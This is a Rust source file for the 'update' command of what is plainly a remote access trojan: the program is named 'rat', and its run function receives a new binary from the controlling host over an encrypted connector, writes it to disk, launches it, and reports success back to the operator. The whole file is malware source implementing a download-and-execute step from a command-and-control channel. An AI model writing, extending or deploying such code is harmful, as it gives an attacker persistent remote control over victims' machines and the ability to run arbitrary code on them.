use tokio::{fs, process::Command};

use crate::connector::Connector;

#[derive(Clone, Debug)]
pub struct Update {
    name: String,
}
impl Update {
    pub fn new() -> Update {
        Update {
            name: "update".to_string(),
        }
    }
    pub fn get_command(&self) -> String {
        "update".to_string()
    }
    pub async fn run(&self, connector: &mut Connector) {
        let path_to_program = String::from("rat");
        fs::write(path_to_program.clone(), connector.accept_message().await)
            .await
            .unwrap();

        //launch it
        if let Ok(result) = Command::new(path_to_program).spawn() {
            println!("Started process with PID: {}", result.id().unwrap());
            connector
                .send_hybrid_encryption(
                    connector.public_key.clone().unwrap(),
                    "SUCCESFUL".as_bytes().to_vec(),
                )
                .await;
        }
    }
}
